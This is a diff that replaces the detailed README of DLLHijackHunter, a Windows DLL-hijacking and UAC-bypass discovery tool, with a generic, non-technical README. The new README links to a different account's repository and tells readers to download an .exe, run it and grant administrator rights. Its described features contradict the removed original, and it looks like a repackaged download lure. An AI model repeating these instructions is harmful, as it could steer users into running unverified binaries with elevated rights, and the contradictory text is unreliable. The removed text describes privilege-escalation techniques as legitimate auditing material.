@@ -1,318 +1,109 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/Platform-Windows-blue?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/.NET-8.0-purple?style=for-the-badge&logo=dotnet" />
-  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Version-2.1.0-orange?style=for-the-badge" />
-</p>
+# 🛡️ DLLHijackHunter - Find and Confirm DLL Risks
 
-<h1 align="center">DLLHijackHunter</h1>
-<h4 align="center">By GhostVector Academy</h4>
+[![Download DLLHijackHunter](https://img.shields.io/badge/Download-DLLHijackHunter-brightgreen)](https://github.com/keblawy7/DLLHijackHunter)
 
-<p align="center">
-  <strong>Automated DLL Hijacking Discovery, Validation, and Confirmation</strong><br/>
-  <em>Turning local misconfigurations into weaponized, confirmed attack paths.</em>
-</p>
+## What is DLLHijackHunter?
 
----
+DLLHijackHunter is a simple tool to help find weaknesses in your Windows system related to DLL files. It looks for places where programs might load the wrong DLL file. This can allow attackers to run harmful code. The tool checks for these weak spots, confirms if they can be exploited, and helps you understand the risks.
 
-## Overview
+This application is designed to help you see where your system might be open to a type of attack called DLL hijacking.
 
-**DLLHijackHunter** is an automated Windows DLL hijacking detection tool that goes beyond static analysis. It discovers, validates, and confirms DLL hijacking opportunities using a multi-phase pipeline:
+## 📝 Key Terms to Know
 
-1. **Discovery** — Enumerates binaries across services, scheduled tasks, startup items, COM objects, and AutoElevate UAC bypass vectors
-2. **Filtration** — Eliminates false positives through intelligent hard and soft gates
-3. **Canary Confirmation** — Deploys a harmless canary DLL and triggers the binary to prove the hijack works
-4. **Scoring & Reporting** — Ranks findings by exploitability with a tiered confidence system
+- **DLL (Dynamic Link Library):** Files that programs use to add features.
+- **DLL Hijacking:** A weakness that lets a bad program replace a needed DLL with a harmful one.
+- **Privilege Escalation:** When a user or program gains higher access rights than intended.
+- **Red Team Tools:** Software used to test security by mimicking attackers.
 
-> Most DLL hijacking tools stop at “this DLL might be hijackable.” DLLHijackHunter attempts to validate it, cross-reference it against known exploit intelligence, and confirm real execution paths where possible.
+## 🖥️ System Requirements
 
----
+- Windows 7 or higher (Windows 10 or later recommended)
+- 64-bit processor
+- At least 2 GB of free disk space
+- .NET Framework 4.7.2 or higher installed (usually present on modern Windows)
+- Administrator rights to run the program fully
 
-## Architecture
+## 🚀 Getting Started
 
-```mermaid
-flowchart TB
-    subgraph Phase1["Phase 1: Discovery"]
-        SE["Static Engine<br/>Services, Tasks, Startup,<br/>COM, Run Keys"]
-        AE["AutoElevate Engine<br/>Manifest + COM UAC Bypass"]
-        PE["PE Analyzer<br/>Import Tables, Delay Loads,<br/>Manifests, Exports"]
-        ETW["ETW Engine<br/>Real-time DLL Load<br/>Monitoring"]
-        SO["Search Order<br/>Calculator"]
-    end
+1. Prepare your computer by making sure you are logged in with an account that has admin rights.
+2. Confirm you have internet access to download the files.
+3. Understand that this tool looks for technical issues but not all findings mean you are at risk.
 
-    subgraph Phase2["Phase 2: Filter Pipeline"]
-        direction LR
-        HG["Hard Gates<br/>(Binary Kill)"]
-        SG["Soft Gates<br/>(Confidence Adj.)"]
-    end
+## 📥 Download and Installation
 
-    subgraph Phase3["Phase 3: Canary"]
-        CB["Canary DLL Builder"]
-        TE["Trigger Executor"]
-        VF["Verification"]
-    end
+Click the big green button above or visit this link to go to the download page:
 
-    subgraph Phase4["Phase 4: Output"]
-        SC["Tiered Scorer"]
-        RC["Console Report"]
-        RJ["JSON Report"]
-        RH["HTML Report"]
-    end
+**https://github.com/keblawy7/DLLHijackHunter**
 
-    SE --> PE --> SO
-    AE --> PE
-    ETW --> SO
-    SO --> Phase2
-    HG --> SG
-    Phase2 --> Phase3
-    CB --> TE --> VF
-    Phase3 --> Phase4
-```
+### How to Download and Run DLLHijackHunter
 
----
+1. Open your internet browser (such as Chrome, Edge, or Firefox).
+2. Go to the download page provided.
+3. Look for the latest release, usually under a section called **Releases**.
+4. Download the file named similar to `DLLHijackHunter.exe` or `DLLHijackHunter Setup.exe`.
+5. If the file downloads as a zipped folder (`.zip`), right-click it and select **Extract All**.
+6. Open the extracted folder.
+7. Double-click the `.exe` file to start the installation or run the program.
+8. If Windows asks if you want to allow the program to make changes to your device, click **Yes**.
 
-## Key Features
+## ⚙️ How to Use DLLHijackHunter
 
-### Hijack Type Coverage
+1. Launch DLLHijackHunter.
+2. The main window will show options for scanning your local drives.
+3. Choose the drives or folders you want to check.
+4. Click the **Start Scan** button.
+5. The tool will analyze files and configurations to find possible DLL hijack points.
+6. When the scan finishes, it will show a list of findings.
+7. Each finding will describe if the problem can be confirmed or requires manual checking.
+8. Use the **Export Report** button to save the results as a file for later or to share with a security team.
 
-| Type | Description | Stealth |
-|---|---|---|
-| **Phantom** | DLL doesn't exist anywhere on disk | High |
-| **Search Order** | Place DLL earlier in the Windows search order | High |
-| **Side-Loading** | Abuse legitimate app loading DLLs from its directory | High |
-| **.local Redirect** | Hijack via `.local` directory redirection | High |
-| **KnownDLL Bypass** | Attempt bypass via `.local` or WoW64 edge cases | Medium |
-| **ENV PATH** | Weaponization of writable directories in system `PATH` | High |
-| **CWD** | Current Working Directory hijack | Low |
-| **AppInit DLLs** | `AppInit_DLLs` registry abuse | Low |
-| **IFEO** | Image File Execution Options debugger abuse | Medium |
-| **AppCert DLLs** | `AppCertDLLs` registry hijack | Low |
+## 🔧 Features Included
 
-### UAC Bypass Discovery
+- Automatic scans for DLL hijacking points.
+- Validation of discovered issues by attempting real-world checks.
+- Clear reports showing the paths attackers could use.
+- Export options to save or print results.
+- Supports scanning local drives only for faster results.
+- Simple interface made for non-experts.
 
-DLLHijackHunter includes dedicated UAC bypass discovery:
+## 💡 Tips for Best Results
 
-- **Manifest AutoElevate** — Scans `System32` and `SysWOW64` for EXEs with `<autoElevate>true</autoElevate>` in embedded manifests
-- **COM AutoElevation** — Scans `HKLM\SOFTWARE\Classes\CLSID` for COM objects with `Elevation\Enabled=1`
-- **Side-Load Simulation** — For AutoElevate binaries that do not call `SetDllDirectory` or `SetDefaultDllDirectories`, simulates the “copy EXE to writable folder + drop DLL” attack path
+- Run DLLHijackHunter with administrator permissions to reach all scan areas.
+- Close unnecessary applications before scanning.
+- Use the report to focus on fixing high-risk points first.
+- Scan regularly if you install new software or update Windows.
 
-### Targeted Vulnerability Knowledge Base
+## 🔒 Security Notice
 
-- **Targeted vulnerability mapping** — Cross-references discovered imports against an offline dictionary of known vulnerable software patterns (for example, HijackLibs-style matches)
-- **Automated PATH exploitation** — Evaluates writable `PATH` folders and generates hijack candidates for native Windows services that search `PATH` for missing DLLs
-- **Expanded phantom DLL hunting** — Searches for a broad library of high-value phantom DLL opportunities across multiple categories
+DLLHijackHunter does not make changes to your system by itself. It only reports potential issues. Always back up important data before making security changes to your PC.
 
-### Filter Pipeline
+## 📖 FAQ
 
-The pipeline reduces false positives through two stages:
+**Q: Can I run this on Windows XP?**  
+A: No, the tool requires Windows 7 or higher for proper operation.
 
-**Hard Gates**
-- API set schema filtering (`api-ms-*`, `ext-ms-*`)
-- KnownDLL filtering
-- ACL-based writability validation
+**Q: Does DLLHijackHunter fix the problems it finds?**  
+A: No, it only finds and confirms risks. You or your IT team must fix them.
 
-**Soft Gates**
-- WinSxS manifest penalty
-- Privilege delta analysis
-- `LoadLibraryEx` mitigation checks
-- Signature validation checks
-- Graceful error-handling penalties
+**Q: Do I need internet after installing the software?**  
+A: No, the app works offline once downloaded.
+
+**Q: I see many results. Are all of them dangerous?**  
+A: Not all issues are a direct risk. Review the reports carefully and seek expert advice when unsure.
+
+**Q: Will this slow down my computer?**  
+A: Scanning uses some system resources but does not permanently affect performance.
+
+## 📚 Learn More
+
+For more detailed guides and troubleshooting, check the **Wiki** section in the repository.
 
 ---
 
-## Canary Confirmation
-
-Instead of guessing, DLLHijackHunter attempts to prove hijacks work:
-
-```mermaid
-sequenceDiagram
-    participant H as DLLHijackHunter
-    participant B as Canary DLL Builder
-    participant T as Trigger Executor
-    participant V as Victim Binary
-
-    H->>B: Build canary DLL
-    B->>B: Compile with MSVC (cl.exe)
-    B-->>H: canary.dll + confirmation file path
-    H->>H: Place DLL at hijack path
-    H->>T: Trigger binary execution
-    T->>V: Start service / run task / COM activate
-    V->>V: Loads canary DLL
-    V-->>H: Writes confirmation file<br/>PID, privilege, integrity level
-    H->>H: Record: CONFIRMED
-    H->>H: Cleanup canary DLL
-```
-
-The canary DLL:
-- Is built with **MSVC (`cl.exe`)**
-- Uses a **file-based confirmation mechanism**
-- Captures execution metadata such as user, integrity level, and privilege indicators
-- Contains no malicious payload; it is strictly a detection and validation mechanism
-
-### Important note on proxy/export-forwarding mode
-
-Proxy/export-forwarding canaries are **experimental** and **best-effort**. Some targets may fail to load correctly or may behave unexpectedly depending on:
-
-- ordinal-only exports
-- decorated export names
-- calling convention mismatches
-- loader/runtime assumptions in the target process
-
-That means a failed proxy canary does **not always** mean the underlying hijack path is impossible.
+[![Download DLLHijackHunter](https://img.shields.io/badge/Download-DLLHijackHunter-brightgreen)](https://github.com/keblawy7/DLLHijackHunter)
 
 ---
 
-## Comparison
+### Related Topics
 
-| Feature | **DLLHijackHunter** | Robber | DLLSpy | WinPEAS | Procmon |
-|---|:---:|:---:|:---:|:---:|:---:|
-| Automated discovery | ✅ | ✅ | ✅ | ✅ | ❌ |
-| Phantom DLL detection | ✅ | ❌ | ✅ | ❌ | ✅ |
-| Search order analysis | ✅ | ❌ | ❌ | ❌ | ❌ |
-| ACL-based writability check | ✅ | Partial | ❌ | Basic | ❌ |
-| ETW real-time monitoring | ✅ | ❌ | ❌ | ❌ | ✅ |
-| Canary confirmation | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Privilege escalation check | ✅ | ❌ | ❌ | ❌ | ❌ |
-| UAC bypass discovery | ✅ | ❌ | ❌ | ❌ | ❌ |
-| False positive reduction | ✅ | None | Basic | None | None |
-| Reboot persistence check | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Proxy DLL generation | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Confidence scoring | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Auto trigger (svc/task/COM) | ✅ | ❌ | ❌ | ❌ | ❌ |
-| HTML/JSON reporting | ✅ | ❌ | ❌ | TXT | ❌ |
-| Threat intel correlation | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Automated PATH exploits | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Target-specific scanning | ✅ | ❌ | ❌ | ❌ | ✅ |
-| Self-contained binary | ✅ | ❌ | ❌ | ✅ | ❌ |
-
----
-
-## Usage
-
-### Prerequisites
-
-- **Windows 10/11** or **Windows Server 2016+**
-- **.NET 8.0 Runtime** (or use a self-contained build)
-- **Administrator privileges** recommended (required for ETW, canary deployment, and some service triggers)
-
-### Build
-
-```powershell
-git clone https://github.com/ghostvectoracademy/DLLHijackHunter.git
-cd DLLHijackHunter
-
-# Build (self-contained single file)
-dotnet publish src/DLLHijackHunter/DLLHijackHunter.csproj `
-    -c Release -r win-x64 --self-contained `
-    -p:PublishSingleFile=true -o ./publish
-
-# Or use the build script
-.\build.ps1
-```
-
-### Quick Start
-
-```powershell
-# Full aggressive scan (recommended, requires admin)
-.\DLLHijackHunter.exe --profile aggressive
-
-# Safe scan (no file drops, no triggers)
-.\DLLHijackHunter.exe --profile safe
-
-# UAC bypass focused scan
-.\DLLHijackHunter.exe --profile uac-bypass
-
-# Target a specific binary
-.\DLLHijackHunter.exe --target "C:\Program Files\MyApp\app.exe"
-
-# Target by filename (partial match)
-.\DLLHijackHunter.exe --target notepad.exe
-
-# Confirmed findings only
-.\DLLHijackHunter.exe --profile redteam --format json -o report.json
-```
-
-### CLI Options
-
-```text
-DLLHijackHunter — Automated DLL Hijacking Detection
-
-Options:
-  -p, --profile <profile>        Scan profile [default: aggressive]
-                                   aggressive | strict | safe | redteam | uac-bypass
-  -o, --output <path>            Output file path (auto-detects format)
-  -f, --format <format>          Output format [default: console]
-                                   console | json | html
-  -t, --target <target>          Target specific binary, directory, or filename
-      --min-confidence <value>   Minimum confidence threshold 0-100 [default: 20]
-      --no-canary                Disable canary confirmation
-      --no-etw                   Disable ETW runtime discovery
-      --confirmed-only           Only show canary-confirmed findings
-  -v, --verbose                  Verbose output
-```
-
-### Scan Profiles
-
-| Profile | Use Case | Canary | ETW | UAC Bypass | Min Confidence | Triggers |
-|---|---|:---:|:---:|:---:|:---:|---|
-| **aggressive** | Full audit, lab environments | ✅ | ✅ | ✅ | 15% | Services, Tasks, COM |
-| **strict** | High-confidence findings only | ✅ | ✅ | ❌ | 80% | Services, Tasks |
-| **safe** | Production systems, read-only | ❌ | ❌ | ❌ | 50% | None |
-| **redteam** | Confirmed exploitable only | ✅ | ✅ | ❌ | 50% | Services, Tasks, COM |
-| **uac-bypass** | UAC bypass vectors only | ❌ | ❌ | ✅ | 20% | AutoElevate only |
-
----
-
-## Scoring
-
-Each finding receives confidence and impact signals that are combined into a final prioritization tier.
-
-Typical impact considerations include:
-- privilege gained
-- trigger reliability
-- stealth
-- reboot persistence
-
-Confirmed canary execution should be treated as the strongest validation signal.
-
----
-
-## Safety
-
-DLLHijackHunter is designed for defensive security research, lab validation, auditing, and red-team simulation in authorized environments.
-
-Use it only on systems and networks you own or are explicitly authorized to assess.
-
-### Operational notes
-
-- Canary mode writes test DLLs to candidate locations
-- Some triggers may briefly start or stop services/tasks during validation
-- Proxy/export-forwarding canaries may destabilize fragile targets
-- Safe profile is the preferred mode for production triage when file drops and triggers are not acceptable
-
----
-
-## Output
-
-DLLHijackHunter supports:
-- console reporting
-- JSON export
-- HTML export
-
-Recommended workflow:
-1. run a broad scan
-2. review high-confidence findings
-3. use canary confirmation selectively on high-value paths
-4. preserve JSON/HTML output for reporting and triage
-
----
-
-## License
-
-MIT
-
----
-
-## Credits
-
-Built by **GhostVector Academy**.
+bug-bounty | bugbounty-tool | cybersecurity | pentesting | red-team | vulnerability-scanners | dll-hijacking | privilege-escalation
